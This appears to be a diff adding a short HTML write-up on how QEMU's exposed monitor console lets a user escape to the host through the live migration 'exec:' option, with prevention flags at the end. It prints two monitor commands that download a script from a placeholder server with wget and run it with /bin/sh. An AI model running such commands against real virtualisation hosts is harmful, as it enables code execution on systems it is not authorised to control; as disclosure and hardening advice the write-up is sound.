@@ -1,0 +1,21 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Qemu Monitor Console</title>
+</head><body>The monitor console is used to administer or debug the guest in the case of any issues, it can also be used to add drives in real time.<br/>
+<br/>
+I mentioned this in a chat room with a bunch of friends, and after a bit of playing around the severity of this console being accessible was realised.<br/>
+<br/>
+The real issue started to become clear when the <a href="https://www.linux-kvm.org/page/Migration">live migration feature</a>&nbsp;was discovered. Since the feature lets you run any unix command in order to handle the migration data, it became an easy way to spawn a shell inside the system.<br/>
+<br/>
+QEMU Compat_monitor0 console (CTRL + ALT (mouse grab) + Shift + 2). Shift + 1 switches back to the Guest OS.<br/>
+(qemu) migrate "exec:wget https://server/script -O /tmp/script"<br/>
+(qemu) migrate "exec:/bin/sh /tmp/script"<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+Prevention:<br/>
+The flag that prevents this from happening appears to be -nographic. <br/>
+I later on discovered that this issue can also be prevented from setting a -monitor &lt;somewhere&gt; flag.</body></html>
